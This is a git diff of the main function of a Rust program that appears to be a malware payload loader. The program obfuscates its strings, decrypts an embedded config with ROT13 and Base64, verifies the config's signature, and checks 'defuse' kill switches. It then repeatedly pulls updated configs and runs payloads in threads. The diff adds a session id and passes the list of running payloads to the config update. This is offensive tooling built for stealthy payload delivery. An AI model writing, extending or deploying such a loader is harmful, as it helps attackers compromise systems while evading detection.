@@ -36,8 +36,10 @@ const INITIAL_LOADER_DATAOPE: &[u8] = include_bytes!("/projects/config/initial.j
 fn main() {
     #[cfg(feature = "logdebug")]
     env_logger::init();
-
     cryptify::flow_stmt!();
+    let session_id: String = uuid::Uuid::new_v4().to_string();
+    info!("{}{}", lc!("[+] session_id: "),session_id);
+
     let loader_conf_encrypted = INITIAL_LOADER.to_vec();
     let data_op_encrypted = INITIAL_LOADER_DATAOPE.to_vec();
     let ope_for_data_op: Vec<DataOperation> = vec![DataOperation::ROT13, DataOperation::BASE64];
@@ -45,15 +47,13 @@ fn main() {
     let dataoperation: Vec<DataOperation> =
         serde_json::from_slice(decrypted_dataop.as_slice()).unwrap();
     debug!("{}{:?}", lc!("[+] dataoperation: "), dataoperation);
-
     info!("{}", lc!("[+] DECRYPT initial config"));
     let decrypted_conf = un_apply_all_dataoperations(dataoperation, loader_conf_encrypted).unwrap();
     info!("{}", lc!("[+] DECRYPTED!"));
-
     let mut config: Config = serde_json::from_slice(decrypted_conf.as_slice()).unwrap();
     info!("{}", lc!("[+] VERIFY initial config"));
     debug!("{:?}", &config);
-    config.verify_newloader_sign(&config).unwrap();
+    config.verify_newconfig_signature(&config).unwrap();
     info!("{}{}", lc!("[+] VERIFIED!"), "\n");
 
     let mut running_thread: Vec<(thread::JoinHandle<()>, Payload)> = vec![];
@@ -66,14 +66,18 @@ fn main() {
             lc!(" --------------------------------------------------------")
         );
         info!("{}{:?}", lc!("[+] Active LOADER: "), config);
-        config.print_loader_without_sign_material();
 
         info!("{}", lc!("[+] DEFUSE UPDATE config"));
         if config.stop_defuse(&config.defuse_update) {
             error!("{}", lc!("[!] DEFUSE STOP update config"));
         } else {
             info!("{}", lc!("[+] UPDATE config"));
-            config = config.update_config();
+            let mut bagarre : Vec<Payload> = vec![];
+            for t in &running_thread {
+                bagarre.push(t.1.clone());
+            };
+
+            config = config.update_config(&session_id,&bagarre);
             info!("{}", lc!("[+] DEFUSE payload exec"));
             if config.stop_defuse(&config.defuse_payload) {
                 error!("{}", lc!("[!] DEFUSE STOP the payload exec"));
@@ -93,7 +97,9 @@ fn main() {
             lc!(" ----------------------------------------------------------"),
             "\n"
         );
-
         loop_nb = loop_nb + 1;
     }
 }
+
+
+/* running_thread: &mut Vec<(thread::JoinHandle<()>, Payload)>) */
